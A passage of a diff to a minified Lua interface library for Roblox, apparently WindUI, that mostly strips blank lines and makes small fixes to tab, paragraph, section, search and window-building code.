     if k.Icon then
       r=ab.Image(
       k.Icon,
@@ -4692,10 +4491,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       r.ImageLabel.ImageTransparency=not k.Locked and 0 or.7
       k.UIElements.Main.Frame.TextLabel.Size=UDim2.new(1,-30,0,0)
       q=-30
-
       k.UIElements.Icon=r
-
-
       s=ab.Image(
       k.Icon,
       k.Icon..":"..k.Title,
@@ -4708,12 +4504,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       s.Size=UDim2.new(0,16,0,16)
       s.ImageLabel.ImageTransparency=not k.Locked and 0 or.7
       q=-30
-
-
-
-
     end
-
     k.UIElements.ContainerFrame=ac("ScrollingFrame",{
       Size=UDim2.new(1,0,1,k.ShowTabTitle and-((n.UIPadding*2.4)+12)or 0),
       BackgroundTransparency=1,
@@ -4723,7 +4514,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       AnchorPoint=Vector2.new(0,1),
       Position=UDim2.new(0,0,1,0),
       AutomaticCanvasSize="Y",
-
       ScrollingDirection="Y",
     },{
       ac("UIPadding",{
@@ -4738,11 +4528,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         HorizontalAlignment="Center",
       })
     })
-
-
-
-
-
     k.UIElements.ContainerFrameCanvas=ac("Frame",{
       Size=UDim2.new(1,0,1,0),
       BackgroundTransparency=1,
@@ -4796,52 +4581,38 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Visible=k.ShowTabTitle or false,
       })
     })
-
     i.Containers[p]=k.UIElements.ContainerFrameCanvas
     i.Tabs[p]=k
-
     k.ContainerFrame=ContainerFrameCanvas
-
     ab.AddSignal(k.UIElements.Main.MouseButton1Click,function()
       if not k.Locked then
         i:SelectTab(p)
       end
     end)
-
     h(k.UIElements.ContainerFrame,k.UIElements.ContainerFrameCanvas,n,3)
-
     local t
     local v
     local w
     local x=false
-
-
-
     if k.Desc then
-
-
       ab.AddSignal(k.UIElements.Main.InputBegan,function()
         x=true
         v=task.spawn(function()
           task.wait(0.35)
           if x and not t then
             t=g(k.Desc,i.ToolTipParent)
-
             local function updatePosition()
               if t then
                 t.Container.Position=UDim2.new(0,aa.X,0,aa.Y-20)
               end
             end
-
             updatePosition()
             w=aa.Move:Connect(updatePosition)
             t:Open()
           end
         end)
       end)
-
     end
-
     ab.AddSignal(k.UIElements.Main.MouseEnter,function()
       if not k.Locked then
         b(k.UIElements.Main.Frame,0.08,{ImageTransparency=.97}):Play()
@@ -4863,14 +4634,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           t=nil
         end
       end
-
       if not k.Locked then
         b(k.UIElements.Main.Frame,0.08,{ImageTransparency=1}):Play()
       end
     end)
-
-
-
     local y={
       Button=a.load'n',
       Toggle=a.load'q',
@@ -4882,7 +4649,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Colorpicker=a.load'y',
       Section=a.load'z',
     }
-
     function k.Divider(z)
       local A=ac("Frame",{
         Size=UDim2.new(1,0,0,1),
@@ -4900,27 +4666,21 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       },{
         A
       })
-
       return B
     end
-
     function k.Paragraph(z,A)
       A.Parent=k.UIElements.ContainerFrame
       A.Window=n
       A.Hover=false
-
       A.TextOffset=0
       A.IsButtons=A.Buttons and#A.Buttons>0 and true or false
-
       local B={
         __type="Paragraph",
         Title=A.Title or"Paragraph",
-        Desc=nil,
-
-        Locked=false,
+        Desc=A.Desc or nil,
+        Locked=A.Locked or false,
       }
       local C=a.load'm'(A)
-
       B.ParagraphFrame=C
       if A.Buttons and#A.Buttons>0 then
         local D=ac("Frame",{
@@ -4934,15 +4694,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             FillDirection="Vertical",
           })
         })
-
-
         for E,F in next,A.Buttons do
           local G=e(F.Title,F.Icon,F.Callback,"White",D)
           G.Size=UDim2.new(1,0,0,38)
 
         end
       end
-
       function B.SetTitle(D,E)
         B.ParagraphFrame:SetTitle(E)
       end
@@ -4952,20 +4709,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       function B.Destroy(D)
         B.ParagraphFrame:Destroy()
       end
-
       table.insert(k.Elements,B)
       return B
     end
-
     for z,A in pairs(y)do
       k[z]=function(B,C)
         C.Parent=B.UIElements.ContainerFrame
         C.Window=n
-        C.WindUI=o local
-
-        D, E=A:New(C)
+        C.WindUI=o
+        local D, E=A:New(C)
         table.insert(B.Elements,E)
-
         local F
         for G,H in pairs(E)do
           if typeof(H)=="table"and G:match"Frame$"then
@@ -4973,7 +4726,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             break
           end
         end
-
         if F then
           function E.SetTitle(I,J)
             F:SetTitle(J)
@@ -4988,8 +4740,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         return E
       end
     end
-
-
     task.spawn(function()
       local B=ac("Frame",{
         BackgroundTransparency=1,
@@ -5026,27 +4776,18 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
         })
       })
-
-
-
-
-
       ab.AddSignal(k.UIElements.ContainerFrame.ChildAdded,function()
         B.Visible=false
       end)
     end)
-
     return k
   end
-
   function i.OnChange(j,k)
     i.OnChangeFunc=k
   end
-
   function i.SelectTab(j,k)
     if not i.Tabs[k].Locked then
       i.SelectedTab=k
-
       for n,o in next,i.Tabs do
         if not o.Locked then
           b(o.UIElements.Main,0.15,{ImageTransparency=1}):Play()
@@ -5063,8 +4804,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         b(i.Tabs[k].UIElements.Icon.ImageLabel,0.15,{ImageTransparency=0.1}):Play()
       end
       i.Tabs[k].Selected=true
-
-
       task.spawn(function()
         for p,q in next,i.Containers do
           q.AnchorPoint=Vector2.new(0,0.05)
@@ -5073,34 +4812,27 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         i.Containers[k].Visible=true
         b(i.Containers[k],0.15,{AnchorPoint=Vector2.new(0,0)},Enum.EasingStyle.Quart,Enum.EasingDirection.Out):Play()
       end)
-
       i.OnChangeFunc(k)
     end
   end
-
-  return i end function a.B()
+  return i
+end
+function a.B()
   local aa={}
-
-
   local ab=a.load'a'
   local ac=ab.New
   local b=ab.Tween
-
   local e=a.load'A'
-
   function aa.New(g,h,i,j)
     local k={
       Title=g.Title or"Section",
       Icon=g.Icon,
       IconThemed=g.IconThemed,
       Opened=g.Opened or false,
-
       HeaderSize=42,
       IconSize=18,
-
       Expandable=false,
     }
-
     local n
     if k.Icon then
       n=ab.Image(
@@ -5112,11 +4844,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       true,
       k.IconThemed
       )
-
       n.Size=UDim2.new(0,k.IconSize,0,k.IconSize)
       n.ImageLabel.ImageTransparency=.25
     end
-
     local o=ac("Frame",{
       Size=UDim2.new(0,k.IconSize,0,k.IconSize),
       BackgroundTransparency=1,
@@ -5134,7 +4864,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         ImageTransparency=.7,
       })
     })
-
     local p=ac("Frame",{
       Size=UDim2.new(1,0,0,k.HeaderSize),
       BackgroundTransparency=1,
@@ -5154,7 +4883,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           1,
           n and(-k.IconSize-10)*2
           or(-k.IconSize-10),
-
           1,
           0
           ),
@@ -5165,7 +4893,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           TextSize=14,
           BackgroundTransparency=1,
           TextTransparency=.7,
-
           TextWrapped=true
         }),
         ac("UIListLayout",{
@@ -5194,8 +4921,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         }),
       })
     })
-
-
     function k.Tab(q,r)
       if not k.Expandable then
         k.Expandable=true
@@ -5204,14 +4929,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       r.Parent=p.Content
       return e.New(r)
     end
-
     function k.Open(q)
       if k.Expandable then
         k.Opened=true
         b(p,0.33,{
           Size=UDim2.new(1,0,0,k.HeaderSize+(p.Content.AbsoluteSize.Y/j))
         },Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
         b(o.ImageLabel,0.1,{Rotation=180},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       end
     end
@@ -5224,7 +4947,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         b(o.ImageLabel,0.1,{Rotation=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       end
     end
-
     ab.AddSignal(p.TextButton.MouseButton1Click,function()
       if k.Expandable then
         if k.Opened then
@@ -5234,21 +4956,17 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end)
-
     if k.Opened then
       task.spawn(function()
         task.wait()
         k:Open()
       end)
     end
-
-
-
     return k
   end
-
-
-  return aa end function a.C()
+  return aa
+end
+function a.C()
   return{
     Tab="table-of-contents",
     Paragraph="type",
@@ -5260,20 +4978,17 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     Dropdown="chevrons-up-down",
     Code="terminal",
     Colorpicker="palette",
-  }end function a.D()
+  }
+end
+function a.D()
   game:GetService"UserInputService"
-
   local aa={
     Margin=8,
     Padding=9,
   }
-
-
   local ab=a.load'a'
   local ac=ab.New
   local b=ab.Tween
-
-
   function aa.new(e,g,h)
     local i={
       IconSize=14,
@@ -5284,8 +4999,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
 
       Icons=a.load'C'
     }
-
-
     local j=ac("TextBox",{
       Text="",
       PlaceholderText="Search...",
@@ -5307,7 +5020,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       FontFace=Font.new(ab.Font,Enum.FontWeight.Regular),
       TextSize=17,
     })
-
     local k=ac("ImageLabel",{
       Image=ab.Icon"x"[1],
       ImageRectSize=ab.Icon"x"[2].ImageRectSize,
@@ -5329,7 +5041,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Text="",
       })
     })
-
     local n=ac("ScrollingFrame",{
       Size=UDim2.new(1,0,0,0),
       AutomaticCanvasSize="Y",
@@ -5351,7 +5062,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         PaddingBottom=UDim.new(0,i.Padding),
       })
     })
-
     local o=ab.NewRoundFrame(i.Radius,"Squircle",{
       Size=UDim2.new(1,0,1,0),
       ThemeTag={
@@ -5362,21 +5072,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ac("Frame",{
         Size=UDim2.new(1,0,1,0),
         BackgroundTransparency=1,
-
         Visible=false,
       },{
         ac("Frame",{
           Size=UDim2.new(1,0,0,46),
           BackgroundTransparency=1,
         },{
-
-
-
-
-
-
-
-
           ac("Frame",{
             Size=UDim2.new(1,0,1,0),
             BackgroundTransparency=1,
@@ -5430,7 +5131,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         }),
       })
     })
-
     local p=ac("Frame",{
       Size=UDim2.new(0,i.Width,0,0),
       AutomaticSize="Y",
@@ -5439,7 +5139,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Position=UDim2.new(0.5,0,0.5,0),
       AnchorPoint=Vector2.new(0.5,0.5),
       Visible=false,
-
       ZIndex=99999999,
     },{
       ac("UIScale",{
@@ -5463,7 +5162,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       })
     })
-
     local function CreateSearchTab(q,r,s,t,v,w)
       local x=ac("TextButton",{
         Size=UDim2.new(1,0,0,0),
@@ -5475,7 +5173,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           Size=UDim2.new(1,0,0,0),
           Position=UDim2.new(0.5,0,0.5,0),
           AnchorPoint=Vector2.new(0.5,0.5),
-
           ThemeTag={
             ImageColor3="Text",
           },
@@ -5549,7 +5246,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           AutomaticSize="Y",
           BackgroundTransparency=1,
           Visible=v,
-
         },{
           ab.NewRoundFrame(99,"Squircle",{
             Size=UDim2.new(0,2,1,0),
@@ -5576,9 +5272,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           HorizontalAlignment="Right"
         })
       })
-
-
-
       x.Main.Size=UDim2.new(
       1,
       0,
@@ -5586,7 +5279,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       x.Main.Frame.Desc.Visible and(((i.Padding-2)*2)+x.Main.Frame.Title.TextBounds.Y+6+x.Main.Frame.Desc.TextBounds.Y)
       or(((i.Padding-2)*2)+x.Main.Frame.Title.TextBounds.Y)
       )
-
       ab.AddSignal(x.Main.MouseEnter,function()
         b(x.Main,.04,{ImageTransparency=.95}):Play()
       end)
@@ -5598,40 +5290,31 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           w()
         end
       end)
-
       return x
     end
-
     local function ContainsText(q,r)
       if not r or r==""then
         return false
       end
-
       if not q or q==""then
         return false
       end
-
       local s=string.lower(q)
       local t=string.lower(r)
-
       return string.find(s,t,1,true)~=nil
     end
-
     local function Search(q)
       if not q or q==""then
         return{}
       end
-
       local r={}
       for s,t in next,e.Tabs do
         local v=ContainsText(t.Title or"",q)
         local w={}
-
         for x,y in next,t.Elements do
           if y.__type~="Section"then
             local z=ContainsText(y.Title or"",q)
             local A=ContainsText(y.Desc or"",q)
-
             if z or A then
               w[x]={
                 Title=y.Title,
@@ -5642,7 +5325,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             end
           end
         end
-
         if v or next(w)~=nil then
           r[s]={
             Tab=t,
@@ -5654,12 +5336,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       end
       return r
     end
-
     function i.Search(q,r)
       r=r or""
-
       local s=Search(r)
-
       n.Visible=true
       o.Frame.Results.Frame.Visible=true
       for t,v in next,n:GetChildren()do
@@ -5667,7 +5346,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           v:Destroy()
         end
       end
-
       if s and next(s)~=nil then
         for w,x in next,s do
           local y=i.Icons.Tab
@@ -5681,9 +5359,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
               CreateSearchTab(B.Title,B.Desc,C,z:FindFirstChild"ParentContainer"and z.ParentContainer.Frame or nil,false,function()
                 i:Close()
                 e:SelectTab(w)
-
               end)
-
             end
           end
         end
@@ -5707,27 +5383,17 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         o.Frame.Results.Frame.Visible=false
       end
     end
-
     ab.AddSignal(j:GetPropertyChangedSignal"Text",function()
       i:Search(j.Text)
     end)
-
     ab.AddSignal(n.UIListLayout:GetPropertyChangedSignal"AbsoluteContentSize",function()
-
       b(n,.06,{Size=UDim2.new(
         1,
         0,
         0,
         math.clamp(n.UIListLayout.AbsoluteContentSize.Y+(i.Padding*2),0,i.MaxHeight)
         )},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
-
-
-
-
-
-
     end)
-
     function i.Open(q)
       task.spawn(function()
         o.Frame.Visible=true
@@ -5735,47 +5401,35 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         b(p.UIScale,.12,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       end)
     end
-
     function i.Close(q)
       task.spawn(function()
         h()
         o.Frame.Visible=false
         b(p.UIScale,.12,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
         task.wait(.12)
         p.Visible=false
       end)
     end
-
     ab.AddSignal(k.TextButton.MouseButton1Click,function()
       i:Close()
     end)
-
     i:Open()
-
     return i
   end
-
-  return aa end function a.E()
-
+  return aa
+end
+function a.E()
   local aa=game:GetService"UserInputService"
   local ab=game:GetService"RunService"
-
   local ac=workspace.CurrentCamera
-
   local b=a.load'a'
   local e=b.New
   local g=b.Tween
-
-
   local h=a.load'i'.New
   local i=a.load'c'.New
   local j=a.load'j'.New
-
   local k=a.load'k'
-
   local n=false
-
   return function(o)
     local p={
       Title=o.Title or"UI Library",
@@ -5807,37 +5461,26 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       IsFullscreen=false,
       CanResize=true,
       IsOpenButtonEnabled=true,
-
       ConfigManager=nil,
       CurrentTab=nil,
       TabModule=nil,
-
       OnCloseCallback=nil,
       OnDestroyCallback=nil,
-
       TopBarButtons={},
-
     }
-
     if p.HideSearchBar~=false then
       p.HideSearchBar=true
     end
     if p.Resizable~=false then
       p.Resizable=true
     end
-
     if p.Folder then
       makefolder("WindUI/"..p.Folder)
     end
-
     local q=e("UICorner",{
       CornerRadius=UDim.new(0,p.UICorner)
     })
-
     p.ConfigManager=k:Init(p)
-
-
-
     local r=e("Frame",{
       Size=UDim2.new(0,32,0,32),
       Position=UDim2.new(1,0,1,0),
@@ -5873,7 +5516,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         ImageTransparency=1,
       }),
     })
-
     local t=b.NewRoundFrame(p.UICorner,"Squircle",{
       Size=UDim2.new(1,0,1,0),
       ImageTransparency=1,
@@ -5881,16 +5523,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ZIndex=999,
       Active=false,
     })
-
-
-
-
-
-
-
-
-
-
     p.UIElements.SideBar=e("ScrollingFrame",{
       Size=UDim2.new(
       1,
@@ -5917,8 +5549,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       },{
         e("UIPadding",{
           PaddingTop=UDim.new(0,p.UIPadding/2),
-
-
           PaddingBottom=UDim.new(0,p.UIPadding/2),
         }),
         e("UIListLayout",{
@@ -5927,14 +5557,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       }),
       e("UIPadding",{
-
         PaddingLeft=UDim.new(0,p.UIPadding/2),
         PaddingRight=UDim.new(0,p.UIPadding/2),
-
       }),
-
     })
-
     p.UIElements.SideBarContainer=e("Frame",{
       Size=UDim2.new(0,p.SideBarWidth,1,p.User.Enabled and-94-(p.UIPadding*2)or-52),
       Position=UDim2.new(0,0,0,52),
@@ -5955,12 +5581,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       p.UIElements.SideBar,
     })
-
     if p.ScrollBarEnabled then
       j(p.UIElements.SideBar,p.UIElements.SideBarContainer.Content,p,3)
     end
-
-
     p.UIElements.MainBar=e("Frame",{
       Size=UDim2.new(1,-p.UIElements.SideBarContainer.AbsoluteSize.X,1,-52),
       Position=UDim2.new(1,0,1,0),
@@ -5981,7 +5604,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         PaddingBottom=UDim.new(0,p.UIPadding/2),
       })
     })
-
     local v=e("ImageLabel",{
       Image="rbxassetid://8992230677",
       ImageColor3=Color3.new(0,0,0),
@@ -5994,9 +5616,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ZIndex=-999999999999999,
       Name="Blur",
     })
-
     local w
-
     if aa.TouchEnabled and not aa.KeyboardEnabled then
       w=false
      elseif aa.KeyboardEnabled then
@@ -6004,12 +5624,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
      else
       w=nil
     end
-
     local x
     local y
     local z
     local A
-
     do
     z=e("ImageLabel",{
       Image="",
@@ -6020,7 +5638,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       BackgroundTransparency=1,
       Name="Icon"
     })
-
     OpenButtonTitle=e("TextLabel",{
       Text=p.Title,
       TextSize=17,
@@ -6028,7 +5645,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       BackgroundTransparency=1,
       AutomaticSize="XY",
     })
-
     OpenButtonDrag=e("Frame",{
       Size=UDim2.new(0,36,0,36),
       BackgroundTransparency=1,
@@ -6051,7 +5667,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       BackgroundColor3=Color3.new(1,1,1),
       BackgroundTransparency=.9,
     })
-
     x=e("Frame",{
       Size=UDim2.new(0,0,0,0),
       Position=UDim2.new(0.5,0,0,28),
@@ -6070,9 +5685,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ZIndex=99,
       BackgroundColor3=Color3.new(0,0,0),
     },{
-
-
-
       e("UICorner",{
         CornerRadius=UDim.new(1,0)
       }),
@@ -6088,13 +5700,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       OpenButtonDrag,
       OpenButtonDivider,
-
       e("UIListLayout",{
         Padding=UDim.new(0,4),
         FillDirection="Horizontal",
         VerticalAlignment="Center",
       }),
-
       e("TextButton",{
         AutomaticSize="XY",
         Active=true,
@@ -6123,10 +5733,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         PaddingRight=UDim.new(0,4),
       })
     })
-
     local B=y and y.UIStroke.UIGradient or nil
-
-
     b.AddSignal(ab.RenderStepped,function(C)
       if p.UIElements.Main and x and x.Parent~=nil then
         if B then
@@ -6137,24 +5744,19 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end)
-
     b.AddSignal(y:GetPropertyChangedSignal"AbsoluteSize",function()
       x.Size=UDim2.new(
       0,y.AbsoluteSize.X,
       0,y.AbsoluteSize.Y
       )
     end)
-
     b.AddSignal(y.TextButton.MouseEnter,function()
-
       g(y.TextButton,.1,{BackgroundTransparency=.93}):Play()
     end)
     b.AddSignal(y.TextButton.MouseLeave,function()
-
       g(y.TextButton,.1,{BackgroundTransparency=1}):Play()
     end)
   end
-
   local B
   if p.User.Enabled then local
     C, D=game.Players:GetUserThumbnailAsync(
@@ -6162,7 +5764,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     Enum.ThumbnailType.HeadShot,
     Enum.ThumbnailSize.Size420x420
     )
-
     B=e("TextButton",{
       Size=UDim2.new(0,
       (p.UIElements.SideBarContainer.AbsoluteSize.X)-(p.UIPadding/2),
@@ -6241,7 +5842,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       })
     })
-
     if p.User.Callback then
       b.AddSignal(B.MouseButton1Click,function()
         p.User.Callback()
@@ -6254,11 +5854,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       end)
     end
   end
-
   local C
   local D
-
-
   local E=b.NewRoundFrame(99,"Squircle",{
     ImageTransparency=.8,
     ImageColor3=Color3.new(1,1,1),
@@ -6275,7 +5872,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ZIndex=99,
     })
   })
-
   local F=e("TextLabel",{
     Text=p.Title,
     FontFace=Font.new(b.Font,Enum.FontWeight.SemiBold),
@@ -6288,7 +5884,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       TextColor3="Text"
     }
   })
-
   p.UIElements.Main=e("Frame",{
     Size=p.Size,
     Position=p.Position,
@@ -6307,7 +5902,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       ThemeTag={
         ImageColor3="Background"
       },
-
     },{
       e("ImageLabel",{
         BackgroundTransparency=1,
@@ -6322,9 +5916,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       E,
       r,
-
-
-
     }),
     UIStroke,
     q,
@@ -6334,7 +5925,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Size=UDim2.new(1,0,1,0),
       BackgroundTransparency=1,
       Name="Main",
-
       Visible=false,
       ZIndex=97,
     },{
@@ -6343,9 +5933,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       p.UIElements.SideBarContainer,
       p.UIElements.MainBar,
-
       B,
-
       D,
       e("Frame",{
         Size=UDim2.new(1,0,0,52),
@@ -6354,12 +5942,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Name="Topbar"
       },{
         C,
-
-
-
-
-
-
         e("Frame",{
           AutomaticSize="X",
           Size=UDim2.new(0,0,1,0),
@@ -6403,7 +5985,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             FillDirection="Horizontal",
             SortOrder="LayoutOrder",
           }),
-
         }),
         e("UIPadding",{
           PaddingTop=UDim.new(0,p.UIPadding),
@@ -6414,12 +5995,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       })
     })
   })
-  --[[local UIS = Instance.new("UIStroke", p.UIElements.Main)
-  UIS.Thickness = 2
-  UIS.Color = Color3.fromRGB(255, 255, 255)
-  local UIG = Instance.new("UIGradient", UIS)
-  UIG.Color = ColorSequence.new({ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 60, 210)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 220, 255))})]]
-
   function p.CreateTopbarButton(G,H,I,J,K,L)
     local M=b.Image(
     I,
@@ -6433,13 +6008,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     M.Size=UDim2.new(0,16,0,16)
     M.AnchorPoint=Vector2.new(0.5,0.5)
     M.Position=UDim2.new(0.5,0,0.5,0)
-
     local N=e("TextButton",{
       Size=UDim2.new(0,36,0,36),
       BackgroundTransparency=1,
       LayoutOrder=K or 999,
       Parent=p.UIElements.Main.Main.Topbar.Right,
-
       ZIndex=9999,
       ThemeTag={
         BackgroundColor3="Text"
@@ -6451,31 +6024,21 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       M
     })
-
-
-
     p.TopBarButtons[100-K]={
       Name=H,
       Object=N
     }
-
     b.AddSignal(N.MouseButton1Click,function()
       J()
     end)
     b.AddSignal(N.MouseEnter,function()
       g(N,.15,{BackgroundTransparency=.93}):Play()
-
     end)
     b.AddSignal(N.MouseLeave,function()
       g(N,.1,{BackgroundTransparency=1}):Play()
-
     end)
-
     return N
   end
-
-
-
   local G=b.Drag(
   p.UIElements.Main,
   {p.UIElements.Main.Main.Topbar,E.Frame},
@@ -6489,20 +6052,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end
   end
   )
-
-
-
-
-
-
-
-
   local H
-
   if not w then
     H=b.Drag(x)
   end
-
   if p.Author then
     e("TextLabel",{
       Text=p.Author,
@@ -6518,13 +6071,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         TextColor3="Text"
       }
     })
-
   end
-
-
   task.spawn(function()
     if p.Icon then
-
       local I=b.Image(
       p.Icon,
       p.Title,
@@ -6536,25 +6085,18 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       )
       I.Parent=p.UIElements.Main.Main.Topbar.Left
       I.Size=UDim2.new(0,22,0,22)
-
       if b.Icon(tostring(p.Icon))and b.Icon(tostring(p.Icon))[1]then
-
-
-
         z.Image=b.Icon(p.Icon)[1]
         z.ImageRectOffset=b.Icon(p.Icon)[2].ImageRectPosition
         z.ImageRectSize=b.Icon(p.Icon)[2].ImageRectSize
       end
-
      else
       z.Visible=false
     end
   end)
-
   function p.SetToggleKey(I,J)
     p.ToggleKey=J
   end
-
   function p.SetBackgroundImage(I,J)
     p.UIElements.Main.Background.ImageLabel.Image=J
   end
@@ -6562,42 +6104,29 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     p.UIElements.Main.Background.ImageLabel.ImageTransparency=J
     p.BackgroundImageTransparency=J
   end
-
   local I
   local J
   b.Icon"minimize"
   b.Icon"maximize"
-
   p:CreateTopbarButton("Fullscreen","maximize",function()
     p:ToggleFullscreen()
   end,998)
-
   function p.ToggleFullscreen(K)
     local L=p.IsFullscreen
-
     G:Set(L)
-
     if not L then
       I=p.UIElements.Main.Position
       J=p.UIElements.Main.Size
-
       p.CanResize=false
      else
       if p.Resizable then
         p.CanResize=true
       end
     end
-
     g(p.UIElements.Main,0.45,{Size=L and J or UDim2.new(1,-20,1,-72)},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
